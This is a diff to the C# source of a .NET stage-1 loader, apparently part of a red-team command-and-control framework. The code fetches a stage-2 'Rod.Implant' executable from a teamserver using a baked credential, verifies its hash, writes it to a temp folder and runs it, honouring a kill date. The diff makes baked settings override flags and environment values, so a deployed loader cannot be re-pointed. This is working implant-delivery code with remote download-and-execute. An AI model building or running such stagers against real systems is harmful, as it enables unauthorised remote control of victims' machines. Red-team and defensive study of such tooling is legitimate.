@@ -1,12 +1,14 @@
 // Rod.Stager is the reference .NET stage-1 loader (architecture.md Sec 6): it
-// fetches a built stage-2 payload from the teamserver, verifies it against the
-// sha256 baked at build time, and runs it; the stage-2 then spends the stager
-// token at its own enroll. It is a benign reference: no evasion, no
-// obfuscation, and no destructive behavior (architecture.md
+// fetches a built stage-2 payload from the teamserver -- each fetch spending
+// one use of the loader's own baked credential -- verifies it against the
+// sha256 baked at build time, and runs it; the stage-2 then enrolls on the
+// credential baked into its own profile. It is a benign reference: no
+// evasion, no obfuscation, and no destructive behavior (architecture.md
 // Sec 7). The whole program is one fetch-and-exec -- the smallest footprint a
 // first-stage loader can honestly have: no protocol bindings, no packages, no
-// key material (the deployment credential arrives at run time, exactly as the
-// stage-2 takes its own token).
+// key material, and in the field no arguments at all (the bake carries the
+// fetch reference and the credential; flags and env only fill an unbaked
+// dev run and never override what was baked).
 
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
@@ -25,7 +27,7 @@ internal static class StagerApp
             cts.Cancel();
         };
 
-        SeedFromBaked();
+        LoadBaked();
 
         string runtimeToken;
         string enrollUrl;
@@ -44,13 +46,27 @@ internal static class StagerApp
             return ex.ExitCode;
         }
 
-        // A token baked at build time backs the flag/env form; an explicit
-        // run-time token wins over it. The loader presents either one for the
-        // stage-2 fetch (verified, never spent).
-        var token = runtimeToken.Length > 0 ? runtimeToken : BakedToken;
+        // The bake is authoritative: a fielded loader cannot be re-pointed
+        // or re-credentialed through flags or the environment. Runtime
+        // values only fill an unbaked dev run.
+        if (BakedEnrollUrl.Length > 0)
+            enrollUrl = BakedEnrollUrl;
+        if (BakedPayloadId.Length > 0)
+            payloadId = BakedPayloadId;
+        var token = BakedToken.Length > 0 ? BakedToken : runtimeToken;
         if (token.Length == 0)
         {
             Console.Error.WriteLine("rod-stager: a stager token is required (-token, ROD_STAGER_TOKEN, or a bake)");
+            return 1;
+        }
+        if (enrollUrl.Length == 0)
+        {
+            Console.Error.WriteLine("rod-stager: an enroll URL is required (-enroll-url, or bake one into the artifact)");
+            return 1;
+        }
+        if (payloadId.Length == 0)
+        {
+            Console.Error.WriteLine("rod-stager: a stage-2 payload id is required (-payload, or bake one into the artifact)");
             return 1;
         }
         if (KillDatePassed())
@@ -65,8 +81,10 @@ internal static class StagerApp
         // undebuggable.
         var log = Quiet ? TextWriter.Null : Console.Error;
 
-        // The fetch rides the same anonymous listener enroll does; the token is
-        // verified without being spent, so the stage-2 below can still spend it.
+        // The fetch rides the same anonymous listener enroll does, and it
+        // spends one use of the loader's credential: the download gate is
+        // the whole job of this token, and the enrollment that follows rides
+        // the credential baked into the stage-2 itself.
         var fetchUrl = FetchUrl(enrollUrl, payloadId);
         log.WriteLine($"rod-stager: fetching stage-2 {payloadId} from {BaseOf(fetchUrl)}");
         byte[] stage2;
@@ -92,8 +110,9 @@ internal static class StagerApp
 
         // The fetched artifact is a self-contained single-file executable
         // (architecture.md Sec 6); running it means executing the file. The
-        // stage-2's own baked profile carries its endpoint, so the only thing
-        // handed across the process boundary is the deployment credential.
+        // stage-2's own baked profile carries everything it needs --
+        // endpoint, credential, cadence -- so nothing operational is handed
+        // across the process boundary.
         var stage2Path = Path.Combine(outDir, OperatingSystem.IsWindows() ? "Rod.Implant.exe" : "Rod.Implant");
         try
         {
@@ -117,20 +136,14 @@ internal static class StagerApp
             FileName = stage2Path,
             UseShellExecute = false,
         };
-        // The stage-2 takes its token from the environment the same way it
-        // takes every other run-time override -- but only a run-time token
-        // forwards. The loader's own baked token is its fetch credential, and
-        // the stage-2 carries its own bake (or its own run-time token); the
-        // process inherits the rest.
-        // An explicit beacon address covers the split topology -- enroll and
-        // beacon behind different frontends -- the same flag the implant takes.
-        // The CA pin forwards too: the stage-2's beacon mTLS needs the same
-        // teamserver identity the loader was told to trust.
-        // Only a run-time token forwards: a baked one is this loader's own
-        // fetch credential, and overriding the stage-2's baked token with it
-        // would spend the wrong secret.
-        if (runtimeToken.Length > 0)
-            start.Environment["ROD_STAGER_TOKEN"] = runtimeToken;
+        // Nothing operational crosses the process boundary: the stage-2's
+        // bake carries its endpoint, credential, and cadence, and its own
+        // precedence rules make them immune to the environment anyway. The
+        // two lab-only forwards serve an unbaked dev stage-2 -- an explicit
+        // beacon address covers the split topology, and the CA pin gives the
+        // beacon mTLS the same teamserver identity the loader was told to
+        // trust. A credential never forwards: the loader's is its fetch
+        // gate, spent above, and the stage-2 spends its own at enroll.
         if (beaconUrl is { Length: > 0 })
             start.Environment["ROD_BEACON_URL"] = beaconUrl;
         if (caCertPath is { Length: > 0 })
@@ -141,14 +154,22 @@ internal static class StagerApp
         return process.ExitCode;
     }
 
-    // --- Run-time configuration: the bake seeds defaults, flags win. ---
+    // --- Run-time configuration: the bake is authoritative, flags and env
+    //     only fill an unbaked dev run. ---
 
     private static string ExpectedSha256 { get; set; } = "";
 
-    // The enrollment credential baked at build time, when the build minted
-    // one. Held here rather than seeded into the environment so the child
-    // stage-2's own bake is never overridden by it.
+    // The fetch credential baked at build time, when the build minted one.
+    // Held here and presented at the fetch -- never seeded into the child's
+    // environment, never overridable at run time.
     private static string BakedToken { get; set; } = "";
+
+    // The fetch reference baked at build time: the listener the loader
+    // fetches from and the stage-2 payload id it fetches. Both override any
+    // run-time value once baked.
+    private static string BakedEnrollUrl { get; set; } = "";
+
+    private static string BakedPayloadId { get; set; } = "";
 
     // Quiet is read after the bake and the flags have both run, so either source
     // turns it on (an explicit ROD_QUIET=0 preset before launch beats the bake).
@@ -200,15 +221,12 @@ internal static class StagerApp
             }
         }
 
-        if (token.Length == 0)
-            throw new ExitProgramException(1, "a stager token is required (-token or ROD_STAGER_TOKEN)");
-        if (enrollUrl.Length == 0)
-            throw new ExitProgramException(1, "an enroll URL is required (-enroll-url, or bake one into the artifact)");
-        if (payloadId.Length == 0)
-            throw new ExitProgramException(1, "a stage-2 payload id is required (-payload, or bake one into the artifact)");
         if (outDir.Length == 0)
             outDir = Path.Combine(Path.GetTempPath(), "rod-stager-" + Guid.NewGuid().ToString("N"));
 
+        // The required-field checks live in RunAsync, after the baked values
+        // have been applied over these: a baked loader supplies them itself,
+        // and an unbaked run must present them via flag or env.
         return (token, enrollUrl, payloadId, outDir, beaconUrl, caCert);
     }
 
@@ -220,10 +238,14 @@ internal static class StagerApp
         return args[i];
     }
 
-    // Applies the build-time baked profile as the defaults (the generated
-    // BakedProfile class), leaving any explicit flag or env untouched. Malformed
-    // baked data is ignored -- a bad bake must not crash the loader.
-    private static void SeedFromBaked()
+    // Loads the build-time baked profile (the generated BakedProfile class)
+    // into the fields the bake owns. Operational keys -- the fetch
+    // reference and the credential -- never touch the environment, so a
+    // fielded loader cannot be re-pointed or re-credentialed; only the
+    // narration default seeds the environment, and only when unset.
+    // Malformed baked data is ignored -- a bad bake must not crash the
+    // loader.
+    private static void LoadBaked()
     {
         var baked = BakedProfile.Json;
         if (baked.Length == 0)
@@ -233,28 +255,27 @@ internal static class StagerApp
             var raw = DecodeBase64Url(baked);
             using var doc = System.Text.Json.JsonDocument.Parse(raw);
             var root = doc.RootElement;
-            SetEnvIfPresent(root, "enrollURL", "ROD_ENROLL_URL");
-            SetEnvIfPresent(root, "stage2PayloadId", "ROD_STAGE2_PAYLOAD_ID");
-            SetEnvIfPresent(root, "killDate", "ROD_KILL_DATE");
+            BakedString(root, "enrollURL", value => BakedEnrollUrl = value);
+            BakedString(root, "stage2PayloadId", value => BakedPayloadId = value);
+            BakedString(root, "token", value => BakedToken = value);
+            BakedString(root, "stage2Sha256", value => ExpectedSha256 = value);
+            BakedString(root, "killDate", value => BakedKillDate = value);
             SetEnvIfPresent(root, "quiet", "ROD_QUIET");
-            if (root.TryGetProperty("token", out var bakedToken)
-                && bakedToken.ValueKind == System.Text.Json.JsonValueKind.String)
-            {
-                var value = bakedToken.GetString();
-                if (!string.IsNullOrEmpty(value))
-                    BakedToken = value;
-            }
-            if (root.TryGetProperty("stage2Sha256", out var sha)
-                && sha.ValueKind == System.Text.Json.JsonValueKind.String)
-            {
-                var value = sha.GetString();
-                if (!string.IsNullOrEmpty(value))
-                    ExpectedSha256 = value;
-            }
         }
         catch
         {
             // Ignore a malformed bake; flags and env still work.
+        }
+    }
+
+    private static void BakedString(System.Text.Json.JsonElement root, string jsonKey, Action<string> apply)
+    {
+        if (root.TryGetProperty(jsonKey, out var value)
+            && value.ValueKind == System.Text.Json.JsonValueKind.String)
+        {
+            var s = value.GetString();
+            if (!string.IsNullOrEmpty(s))
+                apply(s);
         }
     }
 
@@ -269,9 +290,13 @@ internal static class StagerApp
         }
     }
 
+    // The kill date the loader refuses to run past: the baked fuse when the
+    // bake carries one, else a run-time value for the unbaked dev shape.
+    private static string BakedKillDate { get; set; } = "";
+
     private static bool KillDatePassed()
     {
-        var raw = Environment.GetEnvironmentVariable("ROD_KILL_DATE");
+        var raw = BakedKillDate.Length > 0 ? BakedKillDate : Environment.GetEnvironmentVariable("ROD_KILL_DATE");
         if (raw is null)
             return false;
         if (!DateTimeOffset.TryParse(raw, out var killDate))
